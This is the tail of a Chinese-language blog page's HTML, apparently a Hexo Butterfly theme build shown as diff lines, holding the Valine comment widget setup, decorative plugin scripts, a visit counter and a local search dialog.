fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const initValine = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyValine = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const valineConfig = {
+      el: '#vcomment',
+      appId: 'A3w8iHUklSxlnechrHppSu55-gzGzoHsz',
+      appKey: '353fETJcLAQnsDCp9AdmMuCI',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      visitor: true,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
+    }
+
+    new Valine(valineConfig)
+  }
+
+  const loadValine = async (el, path) => {
+    if (typeof Valine === 'function') {
+      initValine(el, path)
+    } else {
+      await btf.getScript('https://unpkg.com/valine/dist/Valine.min.js')
+      initValine(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Valine' === 'Valine'
+      ? window.shuoshuoComment = { loadComment: loadValine }
+      : window.loadOtherComment = loadValine
+    return
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://unpkg.com/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://unpkg.com/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://unpkg.com/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
